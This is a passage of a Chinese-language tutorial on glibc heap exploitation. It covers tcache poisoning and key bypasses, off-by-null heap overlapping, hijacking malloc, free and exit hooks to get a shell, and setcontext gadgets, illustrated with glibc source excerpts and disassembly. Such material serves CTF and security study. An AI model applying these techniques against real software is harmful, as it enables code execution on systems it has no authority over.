<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// glibc ≥ 2.30</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//......</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// glibc &lt; 2.30</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//......</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="tcache-dup">tcache dup</h2>
<p>free 两次之后再 malloc 效果等同于 uaf ，可以进行 tcache poisoning
。</p>
<h2 id="tcache-perthread-corruption">tcache perthread corruption</h2>
<p>通过 tcache poisoning malloc 到 tcache_perthread_struct
就可以控制整个 tcache 。 ## House of IO 其实就是对
<code>tcache_perthread_struct</code>
结构体的攻击，想办法将其释放掉，然后再申请回来，申请回来的时候就能控制整个
tcache 的分配。 ## tcache house of spirit</p>
<p>构造一个 fake chunk free 然后再 malloc 出来从而控制该区域内存。fake
chunk 只需要确保 size 在 tcache 范围即可。 ## tcache extend 修改 chunk
的 size 然后释放并重新申请出来就可以造成堆块重叠。 ## tcache key 自
glibc2.29 版本起 tcache 新增了一个 key 字段，该字段位于 chunk 的 bk
字段，值为 tcache 结构体的地址，若 free() 检测到 chunk-&gt;bk == tcache
则会遍历 tcache 查找对应链表中是否有该chunk。最新版本的一些老 glibc
（如新版2.27等）也引入了该防护机制 ### 泄露堆地址 由于 tcache 用的是 fd
字段所在地址，因此可以通过泄露 tcache key 来泄露堆地址。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f3ee9deabbdb7869c52545aad38e15e3.png"
                     
alt="在这里插入图片描述" 
                > glibc-2.34 开始，tcache 的 key 不再是
<code>tcache_pthread_struct</code> 结构体地址，而是一个随机数
<code>tcache_key</code> ，因此不能通过 key 泄露堆地址。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// glibc-2.33</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// glibc-2.34</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="tcache-key-bypass">tcache key bypass</h3>
<p>在进行 tcache double free 之前，还需要想办法绕过 tcache key 的保护。
常见的 tcache key bypass 手段如下：</p>
<ul>
<li>清除 tcache key：通过一些 UAF 手段将该 free chunk 中记录的 tcache
key清除，从而绕过该检测。</li>
<li>house of kauri：通过修改 size 使两次 free 的同一块内存进入不同的
entries 。</li>
<li>tcache stash with fastbin double free：在 fastbin 中并没有严密的
double free 检测，我们可以在填满对应的 tcache 链条后在 fastbin 中完成
double free，随后通过 stash 机制将 fastbin 中 chunk 倒回 tcache 中。此时
fsat bin double free 就变成了 tcahce double free 。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9c209e59493f988b7dfe2e318e190b0f.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></li>
<li>House of Botcake 同一个 chunk 释放到 tcache 和 unsorted bin
中。释放在 unsorted bin 的 chunk
借助堆块合并改变大小。相对于上一个方法，这个方法的好处是一次 double free
可以多次使用，因为控制同一块内存的 chunk 大小不同。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/b207a8da6850d0f762e962c9e75adc7e.png"
                     
alt="在这里插入图片描述" 
                > ## fastbin_reverse_into_tcache calloc
申请内存不会从 tcache 中获取，而是从 fast bin 中获取。取完后，会将 fast
bin 中的 chunk 放入 tcache 中。如果修改 fast bin 中 chunk 的 fd
指针，则会在 fd + 0x10 地址处写入一个较大的值。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/637c7090884f4df60e1d3a15046d2725.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
如果是使用 malloc 可以先消耗完 tcache 中的 chunk 然后再触发 stash
机制完成攻击。不过为了防止 target 的 fd 指向无效地址，需要在 fast bin
中预留另外 6 个 chunk 来填满 tcache 。</li>
</ul>
<h2 id="tcache-stash-unlink">tcache stash unlink</h2>
<p>从 small bin 中取出 chunk 时会对该 chunk 的 bk 指向的 chunk 的 fd
进行检查：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">idx = smallbin_index (nb);</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">  &#123;</span><br><span class="line">	bck = victim-&gt;bk;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	  malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">	set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">	bin-&gt;bk = bck;</span><br><span class="line">	bck-&gt;fd = bin;</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></div>
<p>但是最后将 small bin 中剩余 chunk 放入 tcache 直到 tcache
填满的过程却不会进行检查。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line"><span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">	&amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">			bck = tc_victim-&gt;bk;</span><br><span class="line">			set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">			<span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">			bin-&gt;bk = bck;</span><br><span class="line">			bck-&gt;fd = bin;</span><br><span class="line">			</span><br><span class="line">			tcache_put (tc_victim, tc_idx);</span><br><span class="line">	     &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>
因此可以采用下面的方法进行攻击：
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f6bbea45f67322f88f6985d6df043863.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
<ul>
<li>small bin 放两个 chunk 是为了绕过第一次从 small bin 取 chunk
时的检查。</li>
<li>tcache 放 5 个 chunk 并 calloc 申请内存既可以保证 两次 stash 将 fake
chunk1 申请出来，同时确保 stash 次数不会过多造成访存错误。</li>
<li>tcache stash unlink 最终效果是任意地址 malloc
和任意地址写某个（些）值。 # Heap Overlapping
这里的堆块重叠指的是指让一个堆块能控制另一个堆块的头部，而不是只能控制内存区域，这个条件比普通的
UAF 要强很多。 ## UAF 转 Heap Overlapping 以 fast bin attack
为例，在堆块的内存区域伪造 chunk 的 size 然后利用 UAF 部分地址写将 fd
修改到伪造的 chunk 头部，之后将 fake chunk 申请出来就可以造成堆块重叠。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/854710cc188652cf94c06c8e819cf87d.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                ></li>
</ul>
<h2 id="off-by-null-转-heap-overlapping">Off by Null 转 Heap
Overlapping</h2>
<p>off by null 比 off by one 条件要弱一些，所以这里只介绍 off by null
制造堆块重叠的方法。</p>
<p>如果是在输入的内容后面一个字节写 0 ，即可以控制下一个 chunk 的
prev_size 和 size 最低 1 字节写 0
那么可以采用下面的方法制造堆块重叠。</p>
<p>如下图所示，释放 chunk1 然后修改 chunk3 的 prev_size 和 PREV_INUSE
位（顺序不能错，否则 chunk1 会与 chunk2 合并出错），之后释放 chunk3 与
chunk1 合并，从而造成堆块重叠。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/893de62bdf917eabe9aab788d640fccf.png"
                     
alt="在这里插入图片描述" 
                > 如果不是在输入的内容后面一个字节写 0
，即在下一个 chunk 的 size 最低 1 字节写 0 但不能控制 prev_size
时可以采用下面的构造方法。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ab55d3ac8513419241df7d2a51681968.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>如果不能释放和申请 tcache/fastbin 范围之外的 chunk
则可以构造如下结构，通过 <code>scanf("%d", &amp;id)</code>
时输入过长的字符串调用产生如下调用栈来申请 unsorted bin 范围的堆块触发
<code>malloc_consolidate</code> 实现堆块合并，最终造成堆块重叠。
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">#<span class="number">0</span>  __GI___libc_malloc (bytes=bytes@entry=<span class="number">2048</span>) at malloc.c:<span class="number">3287</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x00007fd0f0c1e950</span> in __GI___libc_scratch_buffer_grow_preserve (buffer=buffer@entry=<span class="number">0x7ffe7fa7f130</span>) at scratch_buffer_grow_preserve.c:<span class="number">37</span></span><br><span class="line">#<span class="number">2</span>  <span class="number">0x00007fd0f0bdfca2</span> <span class="function">in <span class="title">scratch_buffer_grow_preserve</span> <span class="params">(buffer=&lt;optimized out&gt;)</span> at ../include/scratch_buffer.h:<span class="number">113</span></span></span><br><span class="line"><span class="function">#<span class="number">3</span>  char_buffer_add_slow (buffer=</span>buffer@entry=<span class="number">0x7ffe7fa7f120</span>, ch=&lt;optimized out&gt;) at vfscanf-internal.c:<span class="number">241</span></span><br><span class="line">#<span class="number">4</span>  <span class="number">0x00007fd0f0be04c7</span> in <span class="built_in">char_buffer_add</span> (ch=&lt;optimized out&gt;, buffer=<span class="number">0x7ffe7fa7f120</span>) at vfscanf-internal.c:<span class="number">261</span></span><br><span class="line">#<span class="number">5</span>  __vfscanf_internal (s=&lt;optimized out&gt;, format=&lt;optimized out&gt;, argptr=argptr@entry=<span class="number">0x7ffe7fa7f588</span>, mode_flags=mode_flags@entry=<span class="number">2</span>) at vfscanf-internal.c:<span class="number">1797</span></span><br><span class="line">#<span class="number">6</span>  <span class="number">0x00007fd0f0bdf495</span> in __isoc99_scanf (format=&lt;optimized out&gt;) at isoc99_scanf.c:<span class="number">30</span></span><br></pre></td></tr></table></figure></div> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2986f7661220e9475b8e0217f1db80d5.png"
                     
alt="在这里插入图片描述" 
                > 自 glibc-2.29 起加入了 prev_size
的检查，以上方法均已失效。不过要是能够泄露堆地址可以利用 unlink 或 house
of einherjar 的思想伪造 fd 和 bk 实现堆块重叠。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ## 新版本
Off by Null 不泄露堆地址构造 Heap Overlapping ### 方法1 首先构造两个
small bin 中的 chunk 和一个 large bin 中的 chunk
。然后将其申请出来，通过部分覆盖修改指针为下图所示。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d59d0c9655872fabb9e32b530848af60.png"
                     
alt="在这里插入图片描述" 
                > 之后通过 off by one 把 chunk3 改小放入 fast
bin（或 off by null 进 tcache） ，然后通过部分写将 chunk3 的 fd
指向自己，此时 fake chunk 满足 house of einherjar
条件，可以实现堆块重叠。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2d469bb6521432ee01c21d104363129d.png"
                     
alt="在这里插入图片描述" 
                > ### 方法2 首先采用如下方法伪造出 fake chunk
的 fd 和 bk 。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1afc6f5a794f6acc5eec616d5384ab27.png"
                     
alt="在这里插入图片描述" 
                > 之后利用 unsorted bin 伪造 chunk1 的 bk 。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/658833a8d7e5dbd8a57c6e195035b286.png"
                      alt="在这里插入图片描述"  
                >
由于 unsorted bin 是从 bk 开始取的，不能通过 unsorted bin 来修改 chunk6
的 fd ，因此这里借助 large bin 和部分覆盖来伪造 chunk6 的 fd 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/370edc3263869c638021d42e2174f203.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>至此 fake chunk 满足 house of einherjar 条件，可以实现堆块重叠。 #
malloc_init_state attack malloc_consolidate 会根据 global_max_fast
是否为 0 来判断 ptmalloc 是否已经初始化，因此如果能通过任意地址写将
global_max_fast 置 0 然后触发 malloc_consolidate 就可以调用
malloc_init_state 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// malloc_consolidate逻辑</span></span><br><span class="line"><span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//global_max_fast不为0,表示ptmalloc已经初始化</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//如果global_max_fast为0</span></span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">    <span class="comment">//非debug模式下该宏定义为空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 malloc_init_state 中会将 top chunk 指针指向 unsorted bin
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_init_state</span> <span class="params">(mstate av)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    mbinptr bin;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i) &#123;</span><br><span class="line">        bin = bin_at (av, i);</span><br><span class="line">        bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">        <span class="comment">//遍历所有的bins,初始化每个bin的空闲链表为空,即将bin的fb和bk都指向bin本身</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        set_noncontiguous (av);</span><br><span class="line">        <span class="comment">//对于非主分配区,需要设置为分配非连续虚拟地址空间</span></span><br><span class="line">    <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">        set_max_fast (DEFAULT_MXFAST);</span><br><span class="line">        <span class="comment">//设置fastbin中最大chunk大小</span></span><br><span class="line">        <span class="comment">//只要该全局变量的值非0,也就意味着主分配区初始化了</span></span><br><span class="line">    av-&gt;flags |= FASTCHUNKS_BIT;</span><br><span class="line">    <span class="comment">//标识此时分配区无fastbin</span></span><br><span class="line">    av-&gt;top = initial_top (av);</span><br><span class="line">    <span class="comment">//#define initial_top(M) (unsorted_chunks(M))</span></span><br><span class="line">    <span class="comment">//#define unsorted_chunks(M) (bin_at(M, 1))</span></span><br><span class="line">    <span class="comment">//#define bin_at(m, i) (mbinptr)(((char *) &amp;((m)-&gt;bins[((i) - 1) * 2])) - offsetof (struct malloc_chunk, fd))</span></span><br><span class="line">    <span class="comment">//暂时把top chunk初始化为unsort chunk,仅仅是初始化一个值而已,这个chunk的内容肯定不能用于top chunk来分配内存,主要原因是top chunk不属于任何bin,但ptmalloc中的一些check代码可能需要top chunk属于一个合法的bin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 此时 top chunk 的地址为 &amp;av-&gt;bins[0] - 0x10 ，且
size 为之前的 last_remainder 的值(通常来说堆指针都会很大)，只要不断
malloc ，就可以分配到 hook 指针。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/62388e6733411c94dc97b9b86e5700f2.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
glibc-2.27 开始 malloc_consolidate 不再调用 malloc_init_state
，该方法失效。</p>
<h1 id="各种-hook">各种 HOOK</h1>
<p>对利用最终获取 shell 的方式除了写 got 表外就是覆盖函数指针。glibc
中存在很多 hook 结构可以利用。 ## malloc hook + realloc hook
调用代码如下，传入的参数是申请的字节数。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">  = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div> 可以利用 fastbin
attack 写入 onegadget 来 get shell 。具体利用见前面 fastbin 的 Arbitrary
Alloc 中的介绍。</p>
<p>glibc-2.34 起删除了堆相关 hook 。 ## free hook
调用代码如下，传入参数是释放的指针。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">  = atomic_forced_read (__free_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div> free hook
前面没有可供截取的 size
字段（偶尔有，但是由于值一直在变因此没有成功利用），因此很难利用 fast
bin attack 来攻击，不过可以利用 house of storm 或 tcache attack 攻击。
free hook 的优势是传入参数为释放的内存，因此参数可控，比如将 free hook
改为 system 然后释放带有 <code>/bin/sh</code> 的字符串可以稳定 get shell
。或者利用 setcontext 的 gadget 来设置寄存器来劫持程序执行流程。</p>
<p>glibc-2.34 起删除了堆相关 hook 。 ## exit hook 在 rtld_global
结构体中有 _dl_rtld_lock_recursive 和 _dl_rtld_unlock_recursive
两个函数指针。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">rtld_global</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined SHARED &amp;&amp; defined _LIBC_REENTRANT \</span></span><br><span class="line"><span class="meta">    &amp;&amp; defined __rtld_lock_default_lock_recursive</span></span><br><span class="line">  <span class="function">EXTERN <span class="title">void</span> <span class="params">(*_dl_rtld_lock_recursive)</span> <span class="params">(<span class="type">void</span> *)</span></span>;</span><br><span class="line">  <span class="function">EXTERN <span class="title">void</span> <span class="params">(*_dl_rtld_unlock_recursive)</span> <span class="params">(<span class="type">void</span> *)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>该函数指针指向的函数在 exit 中被调用 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/bac420de9c4efcbc96ed0f31fac496cc.png"
                     
alt="在这里插入图片描述" 
                > <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> _dl_fini(<span class="type">void</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) &#123;</span><br><span class="line">        <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">        __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">    ...</span><br><span class="line">    __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">声明位置: libc-lockP.h  </span><br><span class="line">定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __libc_maybe_call (__pthread_mutex_lock, (&amp;(NAME).mutex), 0)</span></span><br><span class="line"> 替换:  </span><br><span class="line">((&#123;</span><br><span class="line">    __typeof(__pthread_mutex_lock) *_fn = (__pthread_mutex_lock);</span><br><span class="line">    _fn != ((<span class="type">void</span> *) <span class="number">0</span>) ? (*_fn)(&amp;(_dl_load_lock).mutex) : <span class="number">0</span>;</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">声明位置: libc-lockP.h  定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __libc_maybe_call (__pthread_mutex_unlock, (&amp;(NAME).mutex), 0)</span></span><br><span class="line"> 替换:  </span><br><span class="line">((&#123;</span><br><span class="line">    __typeof(__pthread_mutex_unlock) *_fn = (__pthread_mutex_unlock);</span><br><span class="line">    _fn != ((<span class="type">void</span> *) <span class="number">0</span>) ? (*_fn)(&amp;(_dl_load_lock).mutex) : <span class="number">0</span>;</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure></div> <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/76a1c6eaedfdb13e0435205dceea1ffb.png"
                     
alt="在这里插入图片描述" 
                >
只要改写该函数指针就可以在程序结束时劫持程序执行流程。</p>
<p>glibc-2.34 起 <code>__rtld_lock_lock_recursive</code> 和
<code>__rtld_lock_unlock_recursive</code> 定义发生改变，该 hook
失效。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __pthread_mutex_lock (&amp;(NAME).mutex)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __pthread_mutex_unlock (&amp;(NAME).mutex)</span></span><br></pre></td></tr></table></figure></div>
<h1 id="mmap-获取-libc-基地址">mmap 获取 libc 基地址</h1>
<p>当用户的请求超过 mmap 分配阈值，并且主分配区使用 sbrk()
分配失败的时候，或是非主分配区在 top chunk
中不能分配到需要的内存时，ptmalloc 会尝试使用 mmap()
直接映射一块内存到进程内存空间。如果获取到分配的堆块地址，就可以获取一个与
libc 基地址有固定偏移的地址。 # setcontext gadget
setcontext函数是libc中一个独特的函数，它的功能是传入一个 SigreturnFrame
结构指针，然后根据 SigreturnFrame 的内容设置各种寄存器。 因此从
setcontext+53（不同 libc 偏移可能不同）的位置开始有如下 gadget，即根据
rdi 也就是第一个参数指向的 SigreturnFrame 结构设置寄存器。
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000047B75 48 8B A7 A0 00 00 00          mov     rsp, [rdi+0A0h]</span><br><span class="line">.text:0000000000047B7C 48 8B 9F 80 00 00 00          mov     rbx, [rdi+80h]</span><br><span class="line">.text:0000000000047B83 48 8B 6F 78                   mov     rbp, [rdi+78h]</span><br><span class="line">.text:0000000000047B87 4C 8B 67 48                   mov     r12, [rdi+48h]</span><br><span class="line">.text:0000000000047B8B 4C 8B 6F 50                   mov     r13, [rdi+50h]</span><br><span class="line">.text:0000000000047B8F 4C 8B 77 58                   mov     r14, [rdi+58h]</span><br><span class="line">.text:0000000000047B93 4C 8B 7F 60                   mov     r15, [rdi+60h]</span><br><span class="line">.text:0000000000047B97 48 8B 8F A8 00 00 00          mov     rcx, [rdi+0A8h]</span><br><span class="line">.text:0000000000047B9E 51                            push    rcx</span><br><span class="line">.text:0000000000047B9F 48 8B 77 70                   mov     rsi, [rdi+70h]</span><br><span class="line">.text:0000000000047BA3 48 8B 97 88 00 00 00          mov     rdx, [rdi+88h]</span><br><span class="line">.text:0000000000047BAA 48 8B 8F 98 00 00 00          mov     rcx, [rdi+98h]</span><br><span class="line">.text:0000000000047BB1 4C 8B 47 28                   mov     r8, [rdi+28h]</span><br><span class="line">.text:0000000000047BB5 4C 8B 4F 30                   mov     r9, [rdi+30h]</span><br><span class="line">.text:0000000000047BB9 48 8B 7F 68                   mov     rdi, [rdi+68h]</span><br><span class="line">.text:0000000000047BB9                               ; &#125; // starts at 47B40</span><br></pre></td></tr></table></figure></div> 因此只需要设置 rdi 为 SignatureFrame
结构体指针，然后跳转到 <code>setcontext + 53</code> 就可以将<strong>除
rax 外</strong>的寄存器设置成对应的值。</p>
<p>例如 free hook 传入的参数是释放的内存的指针，因此可以通过将 free hook
写入 setcontext gadget 然后 free 一个存储 SigreturnFrame
结构的内存来设置寄存器，继而控制程序执行流程来执行 shellcode 或进一步
rop 。</p>
<p>然而，从 libc-2.29 版本起，setcontext 改用 rdx 寄存器来访问
SigreturnFrame 结构，因此无法直接利用 setcontext 的 gadget 将 free 的
SigreturnFrame 结构赋值给寄存器。 不过可以先泄露堆地址，然后通过下面两条
gadget 中的一条将释放的 chunk 的内存地址赋值给 rdx 然后跳转到 setcontext
的 gadget 。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdx, [rdi+0x8]; mov rax, [rdi]; mov rdi, rdx; jmp rax</span><br><span class="line">mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20]</span><br></pre></td></tr></table></figure></div>
<p>除此之外，也可以直接调用 setcontext 函数给寄存器赋值，这就是 house of
一骑当千。</p>
<p>除了 setcontext 外还有另一个 gedget
可以同时完成程序执行流劫持和栈迁移： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svcudp_reply+22&gt;:	mov    rbp,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;svcudp_reply+26&gt;:	mov    rax,QWORD PTR [rbp+0x18]</span><br><span class="line">&lt;svcudp_reply+30&gt;:	lea    r12,[rbp+0x10]</span><br><span class="line">&lt;svcudp_reply+34&gt;:	mov    DWORD PTR [rbp+0x10],0x0</span><br><span class="line">&lt;svcudp_reply+41&gt;:	mov    rdi,r12</span><br><span class="line">&lt;svcudp_reply+44&gt;:	call   QWORD PTR [rax+0x28]</span><br></pre></td></tr></table></figure></div> 这个 gadget 在不同的
libc 中使用的寄存器不同，具体视情况而定。比如有的 libc 使用的是 rbx
